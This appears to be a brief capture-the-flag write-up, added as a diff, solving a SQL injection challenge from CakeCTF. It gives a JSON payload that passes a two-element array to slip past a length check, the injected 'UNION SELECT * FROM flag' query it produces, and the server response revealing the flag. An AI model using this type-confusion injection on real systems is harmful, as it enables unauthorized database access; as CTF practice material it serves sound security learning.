@@ -1,0 +1,17 @@
+
+sending an array with two elements to bypass the check on length
+
+{"code": ["",
+") UNION SELECT * FROM flag --"]
+}
+
+--> SELECT name FROM country WHERE code=UPPER('['', ') UNION SELECT * FROM flag --']')
+
+flag -> HTTP/1.1 200 OK
+Server: nginx/1.21.6
+Date: Sat, 11 Nov 2023 10:14:04 GMT
+Content-Type: application/json
+Content-Length: 55
+Connection: close
+
+{"name":"CakeCTF{b3_c4refUl_wh3n_y0U_u5e_JS0N_1nPut}"}
